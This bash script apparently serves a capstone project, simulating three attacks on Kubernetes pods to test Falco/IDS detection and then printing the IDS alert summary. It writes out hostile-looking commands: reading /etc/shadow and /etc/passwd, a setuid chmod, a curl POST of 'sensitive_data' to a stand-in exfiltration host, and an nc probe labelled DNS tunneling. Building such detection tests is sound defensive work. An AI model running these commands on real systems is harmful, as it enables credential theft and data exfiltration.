#!/bin/bash
set -e

export KUBECONFIG=/etc/rancher/k3s/k3s.yaml

echo "╔════════════════════════════════════════════════════════╗"
echo "║          ATTACK SIMULATION FOR CAPSTONE REPORT        ║"
echo "╚════════════════════════════════════════════════════════╝"
echo ""

# Get target pods
HEALTHCARE_POD=$(kubectl get pod -n smart-city -l app=healthcare-api -o jsonpath='{.items[0].metadata.name}')
TRAFFIC_POD=$(kubectl get pod -n smart-city -l app=traffic-camera -o jsonpath='{.items[0].metadata.name}')
PARKING_POD=$(kubectl get pod -n smart-city -l app=parking-system -o jsonpath='{.items[0].metadata.name}')

echo "🎯 Target Pods Identified:"
echo "   Healthcare API: $HEALTHCARE_POD"
echo "   Traffic Camera: $TRAFFIC_POD"
echo "   Parking System: $PARKING_POD"
echo ""

# ATK-1: Privilege Escalation Attack
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔴 ATK-1: Privilege Escalation on healthcare-api"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
START_TIME=$(date +%s.%N)

kubectl exec -n smart-city $HEALTHCARE_POD -- sh -c "
  echo 'Simulating privilege escalation...'
  cat /etc/shadow 2>/dev/null || echo 'Attempted unauthorized file access'
  chmod +s /tmp/malicious 2>/dev/null || echo 'Attempted setuid binary creation'
"

sleep 5  # Wait for Falco to detect

END_TIME=$(date +%s.%N)
RESPONSE_TIME=$(echo "$END_TIME - $START_TIME" | bc)

echo "✅ Attack executed in ${RESPONSE_TIME}s"
echo "⏳ Waiting for IDS detection and analysis..."
sleep 10
echo ""

# ATK-2: Suspicious Outbound Traffic
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔴 ATK-2: Suspicious Outbound Traffic from traffic-camera"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
START_TIME=$(date +%s.%N)

kubectl exec -n smart-city $TRAFFIC_POD -- sh -c "
  echo 'Simulating data exfiltration...'
  curl -X POST http://suspicious-external-site.com/exfil -d 'sensitive_data=true' 2>/dev/null || echo 'Attempted external connection'
  nc -zv 8.8.8.8 53 2>&1 || echo 'Attempted DNS tunneling'
"

sleep 5

END_TIME=$(date +%s.%N)
RESPONSE_TIME=$(echo "$END_TIME - $START_TIME" | bc)

echo "✅ Attack executed in ${RESPONSE_TIME}s"
echo "⏳ Waiting for IDS detection and analysis..."
sleep 10
echo ""

# ATK-3: Rapid File Access
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔴 ATK-3: Rapid File Access on parking-system"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
START_TIME=$(date +%s.%N)

kubectl exec -n smart-city $PARKING_POD -- sh -c "
  echo 'Simulating ransomware-like file access...'
  for i in {1..100}; do
    cat /etc/passwd > /dev/null 2>&1 || true
    cat /etc/hosts > /dev/null 2>&1 || true
    cat /proc/cpuinfo > /dev/null 2>&1 || true
  done
  echo 'Rapid file access completed'
"

END_TIME=$(date +%s.%N)
RESPONSE_TIME=$(echo "$END_TIME - $START_TIME" | bc)

echo "✅ Attack executed in ${RESPONSE_TIME}s"
echo "⏳ Waiting for IDS detection and analysis..."
sleep 10
echo ""

# Summary
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📊 ATTACK SIMULATION COMPLETE"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "Fetching IDS Analysis..."

IDS_POD=$(kubectl get pod -n smart-city -l app=ids-api -o jsonpath='{.items[0].metadata.name}')

kubectl exec -n smart-city $IDS_POD -- python3 - << 'PYTHON_EOF'
import urllib.request, json

try:
    data = json.loads(urllib.request.urlopen("http://localhost:8000/api/alerts?limit=10").read())
    
    print("\n╔════════════════════════════════════════════════════════╗")
    print("║              ATTACK DETECTION SUMMARY                  ║")
    print("╚════════════════════════════════════════════════════════╝\n")
    
    print(f"Total Alerts Detected: {data['total']}\n")
    
    for i, alert in enumerate(data["alerts"][:3], 1):
        print(f"Attack #{i}:")
        print(f"  Rule: {alert['alert']['rule']}")
        print(f"  Target: {alert['alert'].get('pod', 'N/A')}")
        print(f"  Source: {alert['source'].upper()}")
        print(f"  Time: {alert['timestamp']}")
        
        if alert.get("analysis"):
            print("  AI Analysis:")
            print(f"    Severity: {alert['analysis'].get('severity', 'N/A')}/10")
            print(f"    Threat Type: {alert['analysis'].get('threat_type', 'N/A')}")
            print(f"    Confidence: {alert['analysis'].get('confidence', 'N/A')}")
        
        actions = alert.get('actions', [])
        print(f"  Actions Taken: {', '.join(actions) if actions else 'None'}")
        print()

except Exception as e:
    print(f"❌ Error fetching alerts: {e}")
PYTHON_EOF

echo ""
echo "╔════════════════════════════════════════════════════════╗"
echo "║     ✅ ALL ATTACKS SIMULATED FOR REPORT TABLE 17      ║"
echo "╚════════════════════════════════════════════════════════╝"
